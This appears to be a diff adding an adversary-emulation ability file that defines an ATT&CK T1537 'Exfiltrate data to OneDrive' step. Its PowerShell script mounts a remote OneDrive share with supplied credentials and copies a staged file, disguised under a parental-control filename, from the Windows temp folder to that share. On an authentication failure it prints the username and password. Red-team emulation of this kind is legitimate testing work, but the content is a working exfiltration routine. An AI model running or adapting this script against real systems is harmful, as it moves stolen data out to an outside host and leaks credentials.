@@ -1,0 +1,34 @@
+---
+- id: 4840d6dd-da13-401a-be46-05db56f4e1e0
+  name: 18.A - Exfiltrate data to OneDrive
+  description: Transfer data to a OneDrive account
+  tactic: exfiltration
+  technique:
+    attack_id: T1537
+    name: Transfer Data to Cloud Account
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $err = $(net use y: #{onedrive.url} /user:#{onedrive.username} "#{onedrive.password}" 2>&1);
+          if($err -Like "*System error 85*") {
+            Write-Host "OneDrive net drive is already mounted!";
+          } elseif($err -Like "*System error 67*") {
+            Write-Host "OneDrive net drive mount failed - Check URL!";
+            Write-Host "#{onedrive.url}";
+            exit 1;
+          } elseif($err -Like "*System error 1244*") {
+            Write-Host "Could not authenticate to OneDrive - Check Creds!";
+            Write-Host "User: #{onedrive.username}";
+            Write-Host "Password: #{onedrive.password}";
+            exit 1;
+          }
+
+          Write-Host "Mount Successful"
+          Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "y:\WindowsParentalControlMigration.tmp" -Force;
+          if(!$?){
+            exit 1;
+          }
+          
+          Write-Host "Copy Successfull"
+          exit 0;
